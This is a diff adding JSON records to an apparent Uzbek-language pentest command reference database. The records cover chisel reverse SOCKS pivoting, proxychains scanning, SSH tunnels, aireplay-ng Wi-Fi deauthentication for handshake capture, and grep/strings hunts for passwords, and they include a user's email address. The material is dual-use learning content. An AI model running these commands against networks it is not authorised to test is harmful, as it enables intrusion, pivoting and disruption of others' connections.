+      "commandText": "./chisel client <your_ip>:8000 R:1080:socks",
+      "shortDesc": "Nishon kompyuterdan Kali'ga SOCKS5 proksi tunnel ochish",
+      "fullDoc": "Nishon kompyuter ichki yopiq tarmoqda bo'lsa, uning ichki tarmog'iga Kali orqali kirish imkonini beradi.\n\nQAYSI JOYGA NIMA YOZILADI:\n- `<your_ip>` - Kali Linux IP manzilingiz.",
+      "parameters": "[{\"flag\":\"R:1080:socks\",\"desc\":\"Reverse SOCKS proksi portini 1080 da ochish\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 91,
+      "title": "Proxychains: Buyruqlarni Proksi Orqali Yuborish",
+      "category": "PrivEsc & Tools",
+      "commandText": "proxychains nmap -sT -Pn 10.10.10.5",
+      "shortDesc": "Chisel yoki SSH tunnel orqali ichki tarmoqdagi kompyuterlarni skan qilish",
+      "fullDoc": "Barcha tarmoq so'rovlarini tayyor tunnel (SOCKS5) orqali ichkariga yo'naltiradi.\n\nQAYSI JOYGA NIMA YOZILADI:\n- `10.10.10.5` - Ichki yopiq tarmoqdagi IP.",
+      "parameters": "[{\"flag\":\"proxychains\",\"desc\":\"So'rovlarni /etc/proxychains.conf dagi proksidan o'tkazish\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 92,
+      "title": "SSH Port Forwarding (Local Tunnel)",
+      "category": "PrivEsc & Tools",
+      "commandText": "ssh -L 8080:127.0.0.1:80 user@<target_ip>",
+      "shortDesc": "-L: Nishon kompyuterdagi yopiq 80-portni o'zingizning 8080 portingizga bog'lash",
+      "fullDoc": "Nishon server ichida faqat o'zi uchun ochib qo'yilgan (127.0.0.1) veb-saytlarni o'zingizning brauzeringizda `localhost:8080` deb ochishga imkon beradi.\n\nQAYSI JOYGA NIMA YOZILADI:\n- Misol: ssh -L 8080:127.0.0.1:80 ubuntu@192.168.1.15",
+      "parameters": "[{\"flag\":\"-L 8080:127.0.0.1:80\",\"desc\":\"Lokal port yo'naltirish (Local Port Forwarding)\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 93,
+      "title": "SSH Dynamic Port Forwarding (SOCKS Proxy)",
+      "category": "PrivEsc & Tools",
+      "commandText": "ssh -D 9050 user@<target_ip>",
+      "shortDesc": "-D 9050: SSH orqali o'zingizga to'liq SOCKS5 Proksi server yaratish",
+      "fullDoc": "Server orqali uning butun ichki tarmog'ini brauzer yoki proxychains yordamida kezish imkoniyatini beradi.\n\nQAYSI JOYGA NIMA YOZILADI:\n- `9050` - Proxychains standart port raqami.",
+      "parameters": "[{\"flag\":\"-D 9050\",\"desc\":\"Dynamic SOCKS5 portini ochish\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 94,
+      "title": "Airmon-ng: Wi-Fi Kartani Monitor Rejimiga O'tkazish",
+      "category": "Wireless & Utils",
+      "commandText": "sudo airmon-ng start wlan0",
+      "shortDesc": "start wlan0: Wi-Fi kartasini havodagi barcha paketlarni tutuvchi rejimga o'tkazish",
+      "fullDoc": "Wi-Fi xakerligida atrofdagi barcha Wi-Fi tarmoqlarini va ulangan telefonlarni ko'rish uchun kartani 'Monitor mode'ga o'tkazish shart.\n\nQAYSI JOYGA NIMA YOZILADI:\n- `wlan0` - Wi-Fi karta nomi.",
+      "parameters": "[{\"flag\":\"start wlan0\",\"desc\":\"Monitor rejimini yoqish (wlan0mon hosil bo'ladi)\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 95,
+      "title": "Airodump-ng: Havodagi Wi-Fi Tarmoqlarini Kuzatish",
+      "category": "Wireless & Utils",
+      "commandText": "sudo airodump-ng wlan0mon",
+      "shortDesc": "Atrofdagi barcha Wi-Fi nomi (SSID), signali va MAC manzillarini ko'rsatish",
+      "fullDoc": "Atrofingizdagi Wi-Fi tarmoqlari va ularga kimlar ulanganini havoni eshitish orqali ko'rsatadi.\n\nQAYSI JOYGA NIMA YOZILADI:\n- `wlan0mon` - Monitor rejimidagi karta nomi.",
+      "parameters": "[{\"flag\":\"wlan0mon\",\"desc\":\"Monitor rejimidagi Wi-Fi interfeysi\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 96,
+      "title": "Aireplay-ng: Wi-Fi Foydalanuvchisini Tarmoqdan Uzish (Deauth)",
+      "category": "Wireless & Utils",
+      "commandText": "sudo aireplay-ng --deauth 10 -a <router_mac> -c <client_mac> wlan0mon",
+      "shortDesc": "--deauth 10: 10 marotaba tarmoqdan uzish paketi yuborish",
+      "fullDoc": "Wi-Fi xeshini (Handshake) tutib olish uchun ulangan telefonni Wi-Fi'dan uzib yuboradi, telefon qayta ulaganda xesh tutib olinadi.\n\nQAYSI JOYGA NIMA YOZILADI:\n- `<router_mac>` - Wi-Fi roter MAC manzili.\n- `<client_mac>` - Telefon yoki no'tbuk MAC manzili.",
+      "parameters": "[{\"flag\":\"--deauth 10\",\"desc\":\"Uzib yuborish paketlar soni\"},{\"flag\":\"-a\",\"desc\":\"Router BSSID (MAC)\"},{\"flag\":\"-c\",\"desc\":\"Mijoz (Client) MAC\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 97,
+      "title": "Binwalk: Fayl Ichidagi Yashirin Ma'lumotlarni Ajratish",
+      "category": "Wireless & Utils",
+      "commandText": "binwalk -e firmware.bin",
+      "shortDesc": "-e: Fayl yoki proshivka (firmware) ichida yashiringan boshqa fayllarni ochib olish",
+      "fullDoc": "Rasm, audio yoki router proshivkalari ichiga yashirilgan arxivlar va maxfiy ma'lumotlarni topadi.\n\nQAYSI JOYGA NIMA YOZILADI:\n- `firmware.bin` - Tekshirilayotgan fayl.",
+      "parameters": "[{\"flag\":\"-e\",\"desc\":\"Extract (Fayllarni ajratib chiqarib berish)\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 98,
+      "title": "Strings: Fayl Ichidagi O'qilishi Mumkin Bo'lgan Matnlarni Chiqarish",
+      "category": "Wireless & Utils",
+      "commandText": "strings binary_file | grep -i pass",
+      "shortDesc": "Dasturchilar fayl ichida unutib qoldirgan parollar va kalitlarni qidirish",
+      "fullDoc": "Bajariluvchi (.exe, ELF) fayllar ichidan inson o'qiy oladigan barcha matnlarni ajratadi va grep orqali 'pass' so'zini qidiradi.\n\nQAYSI JOYGA NIMA YOZILADI:\n- `binary_file` - Har qanday fayl nomi.",
+      "parameters": "[{\"flag\":\"grep -i pass\",\"desc\":\"Katta-kichik harfga qaramay 'pass' so'zini qidirish\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 99,
+      "title": "Exiftool: Rasm va Fayl Metama'lumotlarini Olish",
+      "category": "Wireless & Utils",
+      "commandText": "exiftool image.jpg",
+      "shortDesc": "Rasm qachon, qaysi telefon va qaysi GPS lokatsiyada olinganini ko'rish",
+      "fullDoc": "Fayllarning metama'lumotlarini (muallif nomi, vaqti, GPS koordinatalari va kamera modeli) ko'rsatadi.\n\nQAYSI JOYGA NIMA YOZILADI:\n- `image.jpg` - Tekshirilayotgan rasm yoki PDF fayl.",
+      "parameters": "[{\"flag\":\"exiftool\",\"desc\":\"Metadata reader utilitasi\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 100,
+      "title": "Steghide: Rasm Ichiga Yashiringan Matnni Ochish",
+      "category": "Wireless & Utils",
+      "commandText": "steghide extract -sf secret.jpg",
+      "shortDesc": "-sf: Stego fayl; Rasm ichidagi yashirin ma'lumotni chiqarib olish",
+      "fullDoc": "Steganografiya (rasm ichiga ma'lumot yashirish) usuli bilan yashirilgan fayllarni parol yordamida ajratadi.\n\nQAYSI JOYGA NIMA YOZILADI:\n- `secret.jpg` - Yashirin ma'lumot bor deb gumon qilingan rasm.",
+      "parameters": "[{\"flag\":\"extract -sf\",\"desc\":\"Stego-fayl tarkibini ajratish\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 101,
+      "title": "Grep: Papka Ichidagi Barcha Fayllardan Matn Qidirish",
+      "category": "Wireless & Utils",
+      "commandText": "grep -rnw '/path/to/folder/' -e 'password'",
+      "shortDesc": "-rnw: Barcha papkalar va fayllar ichidan belgilangan so'zni qidirish",
+      "fullDoc": "Butun bir loyiha yoki kodingiz ichidan 'password', 'api_key' yoki 'token' so'zlari qaysi fayllarda yozilganini darhol topib beradi.\n\nQAYSI JOYGA NIMA YOZILADI:\n- `/path/to/folder/` - Qidirilayotgan papka yo'li.",
+      "parameters": "[{\"flag\":\"-r\",\"desc\":\"Recursive (Papkalar ichiga ham kirish)\"},{\"flag\":\"-n\",\"desc\":\"Qatordan raqamini ko'rsatish\"},{\"flag\":\"-w\",\"desc\":\"To'liq so'z bo'yicha qidirish\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 102,
+      "title": "Base64: Matnni Shifrlash va Deshifrlash",
+      "category": "Wireless & Utils",
+      "commandText": "echo 'SGVsbG8=' | base64 -d",
+      "shortDesc": "-d: Decode (Base64 ko'rinishidagi shifrlangan matnni asl holiga keltirish)",
+      "fullDoc": "Web va CTF masalalarida ko'p uchraydigan Base64 matnlarni tezda o'qish uchun ishlatiladi.\n\nQAYSI JOYGA NIMA YOZILADI:\n- `'SGVsbG8='` o'rniga o'zingizdagi base64 matn kiritiladi.",
+      "parameters": "[{\"flag\":\"-d\",\"desc\":\"Decode (Deshifrovka qilish)\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    },
+    {
+      "id": 103,
+      "title": "Ncat: SSL/TLS Shifrlangan Ulanish Ochish",
+      "category": "Wireless & Utils",
+      "commandText": "ncat --ssl <target> 443",
+      "shortDesc": "--ssl: Xavfsiz Shifrlangan (HTTPS/SSL) portlar bilan muloqot qilish",
+      "fullDoc": "Standart Netcat SSL shifrlashni tushunmaydi. Ncat esa 443-port kabi shifrlangan xizmatlar bilan bevosita muloqot qila oladi.\n\nQAYSI JOYGA NIMA YOZILADI:\n- Misol: ncat --ssl google.com 443",
+      "parameters": "[{\"flag\":\"--ssl\",\"desc\":\"SSL/TLS shifrlash rejimini yoqish\"}]",
+      "createdAt": "2026-08-19 08:30:25"
+    }
+  ],
+  "CommandComment": [
+    {
+      "id": 1,
+      "commandId": 54,
+      "authorName": "Muxammad Sodiq",
+      "authorEmail": "freelancer.vip.uz@gmail.com",
+      "body": "hehehehe",
+      "createdAt": 1787233226273
+    }
+  ],
+  "sqlite_sequence": [
+    {
+      "name": "Command",
+      "seq": 103
+    },
+    {
+      "name": "CommandPower",
+      "seq": 7
+    },
+    {
+      "name": "CommandComment",
+      "seq": 1
+    }
+  ],
+  "CommandPower": [
+    {
+      "id": 6,
+      "commandId": 54,
+      "userEmail": "freelancer.vip.uz@gmail.com",
+      "createdAt": 1787233139688
+    },
+    {
+      "id": 7,
+      "commandId": 55,
+      "userEmail": "freelancer.vip.uz@gmail.com",
+      "createdAt": 1787233290220
+    }
+  ]
+}
